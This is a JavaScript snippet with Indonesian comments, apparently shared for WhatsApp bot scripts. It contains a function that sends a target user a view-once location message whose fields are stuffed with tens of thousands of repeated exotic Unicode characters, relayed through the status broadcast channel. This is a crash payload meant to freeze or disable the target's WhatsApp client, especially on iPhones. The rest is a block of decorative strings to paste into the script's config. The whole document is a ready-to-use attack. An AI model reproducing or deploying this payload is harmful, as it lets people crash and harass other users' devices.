// INI FUNCTION NYA, PENJELASAN DI BAWAH TOLONG DI PAHAMI YA !

async function iPhonesVisible(than, X) {
        	try {
        		const locationMessage = {
        			degreesLatitude: -9.09999262999,
        			degreesLongitude: 199.99963118999,
        			jpegThumbnail: null,
        			name: nick.sksk + tts.qcf + "𑇂𑆵𑆴𑆿".repeat(15000),
        			address: nick.aaa + nick.aaa + "𑇂𑆵𑆴𑆿".repeat(5000),
        			url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        		}
        		
        		const msg = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await than.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [X],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: X },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };
        
// TEMPEL INI DI BAGIAN SETTINGS.JS ATAU CONFIG.JS DI SC MU
// SESUAIKAN SAJA DENGAN SC MU

global.nick = {
    aaa: "Than Superior",
    bbb: "Zyrex Made By Than",
    ccc: "—!s thann xs",
    ddd: "Always Thann",
    eee: "Xs Zyrex",
    sss: "Than Executions",
    kkk: "🎭꙳͙͡༑ᐧ ̬ThanTzy ̬꙳͙͡༑ᐧ〽️",
    zzz: "꙳͙͡༑ᐧ Executions ( 🎭 ) Univers꙳͙͡༑ᐧ̤",
    ooo: "Than XS 🐉",
    lll: "Zyrex CrowsZero Created By Than 🎭",
    sksk: "ThanZC",
    tqtq: "( ? ) Than - How To Make This"
}

global.tts = {
    csx: "⍣᳟༑ Than Executions Vaultཀ͜͡༑⃟꙳〽️",
    scx: "🤡⃟꙳͙͡༑ᐧ𝟑𝒆̬᪳𝑺𝑪͜𝒂𝒏͡𝒐𝒓 Ex𝒔planesiveཀ͜͡༑⃟🐉",
    vcx: " ꙳͙͡༑ᐧ ̬ApCb Njir ̬꙳͙͡༑ᐧ🐉",
    cltx: "    ⃟꙳͙͡༑ᐧ ̬𝒔 ꙳͙͡༑⃟ᐧ   ",
    qtx: "꙳͙͡༑ᐧ ̬ 𝚯𝐒   ̬꙳͙͡༑",
    ssc: " We For Than #🇧🇷 ( 𝟔𝟔𝟔 )",
    qcf: "# 𝘏𝘢𝘴𝘩𝘪𝘮𝘶𝘳𝘢 𝘛𝘦𝘯𝘬𝘶 ( CrowsZero )",
    yrw: "  𝕻𝖊̨𝖗𝖘𝖎𝖝 ( thantzy )〽️ ꙳͙͡༑ᐧ ̬thann x͡𝒔 ̬꙳͙͡༑ᐧ〽️ "
}